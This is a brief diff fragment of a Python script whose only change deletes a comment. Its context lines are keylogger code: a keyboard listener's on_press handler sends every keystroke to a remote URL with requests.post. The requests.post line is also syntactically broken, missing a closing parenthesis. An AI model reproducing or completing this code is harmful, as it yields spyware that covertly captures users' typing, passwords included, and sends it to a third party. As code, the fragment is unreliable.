@@ -9,6 +9,5 @@ def on_press(key):
     except AttributeError:
         requests.post(url, data='{0}'.format(key)
 
-# Collect events until released
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
